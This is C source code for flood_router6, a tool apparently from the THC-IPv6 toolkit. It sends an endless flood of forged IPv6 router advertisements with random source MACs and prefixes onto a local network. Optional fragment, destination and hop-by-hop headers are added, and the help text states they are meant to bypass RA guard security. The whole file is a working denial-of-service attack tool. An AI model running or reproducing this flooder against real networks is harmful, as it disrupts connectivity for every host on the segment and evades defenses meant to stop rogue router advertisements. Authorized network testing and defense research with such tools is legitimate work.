#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-HFD] interface\n\n", prg);
  printf("Flood the local network with router advertisements.\n");
  printf(
      "-F/-D/-H add fragment/destination/hopbyhop header to bypass RA guard "
      "security.\n");

  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface, mac[6] = "";
  unsigned char *routerip6, *route6, *mac6 = mac, *ip6;
  unsigned char  buf[56], buf2[6], buf3[1504];
  unsigned char *dst = thc_resolve6("ff02::1"),
                *dstmac = thc_get_multicast_mac(dst);
  int            size, mtu, i, type = NXT_ICMP6;
  unsigned char *pkt = NULL;
  int pkt_len = 0, rawmode = 0, count = 0, do_hop = 0, do_frag = 0, cnt,
      do_dst = 0, offset = 14;
  thc_ipv6_hdr *hdr = NULL;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  printf(
      "!\n! Please note: flood_router6 is deprecated, please use "
      "flood_router26!\n!\n\n");

  while ((i = getopt(argc, argv, "DFHr")) >= 0) {
    switch (i) {
      case 'r':
        thc_ipv6_rawmode(1);
        rawmode = 1;
        break;
      case 'F':
        do_frag++;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 1) help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[optind];
  mtu = 1500;
  size = 64;
  ip6 = malloc(16);
  routerip6 = malloc(16);
  route6 = malloc(16);
  if (do_hdr_size) offset = do_hdr_size;

  mac[0] = 0x00;
  mac[1] = 0x18;
  memset(ip6, 0, 16);
  ip6[0] = 0xfe;
  ip6[1] = 0x80;
  ip6[8] = 0x02;
  ip6[9] = mac[1];
  ip6[11] = 0xff;
  ip6[12] = 0xfe;
  routerip6[0] = 0x2a;
  routerip6[1] = 0x01;
  routerip6[15] = 0x01;
  memset(route6 + 8, 0, 8);

  memset(buf2, 0, sizeof(buf2));
  memset(buf3, 0, sizeof(buf3));

  memset(buf, 0, sizeof(buf));
  buf[1] = 250;
  buf[5] = 30;
  buf[8] = 5;
  buf[9] = 1;
  buf[12] = mtu / 16777216;
  buf[13] = (mtu % 16777216) / 65536;
  buf[14] = (mtu % 65536) / 256;
  buf[15] = mtu % 256;
  buf[16] = 3;
  buf[17] = 4;
  buf[18] = size;
  buf[19] = 128 + 64 + 32;
  memset(&buf[20], 255, 8);
  buf[48] = 1;
  buf[49] = 1;

  printf(
      "Starting to flood network with router advertisements on %s (Press "
      "Control-C to end, a dot is printed for every 1000 packets):\n",
      interface);
  while (1) {
    for (i = 2; i < 6; i++)
      mac[i] = rand() % 256;
    for (i = 2; i < 8; i++)
      routerip6[i] = rand() % 256;

    //    ip6[9] = mac[1];
    ip6[10] = mac[2];
    ip6[13] = mac[3];
    ip6[14] = mac[4];
    ip6[15] = mac[5];
    memcpy(route6, routerip6, 8);
    memcpy(&buf[32], route6, 16);
    memcpy(&buf[50], mac6, 6);

    count++;

    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6,
                                        dst, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (do_hop) {
      type = NXT_HBH;
      if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, sizeof(buf2)) < 0)
        return -1;
    }
    if (do_frag) {
      if (type == NXT_ICMP6) type = NXT_FRAG;
      for (i = 0; i < do_frag; i++)
        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, cnt++) < 0) return -1;
    }
    if (do_dst) {
      if (type == NXT_ICMP6) type = NXT_DST;
      if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return -1;
    }
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff08ffff, buf,
                      sizeof(buf), 0) < 0)
      return -1;
    if (do_dst) {
      thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
      hdr = (thc_ipv6_hdr *)pkt;
      thc_send_as_fragment6(interface, ip6, dst, type, hdr->pkt + 40 + offset,
                            hdr->pkt_len - 40 - offset, 1240);
    } else {
      if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) <
          0) {
        printf("!");
        //        fprintf(stderr, "Error sending packet no. %d on interface %s:
        //        ", count, interface); perror(""); return -1;
      }
    }

    pkt = thc_destroy_packet(pkt);
    //    usleep(1);
    if (count % 1000 == 0) printf(".");
  }
  return 0;
}
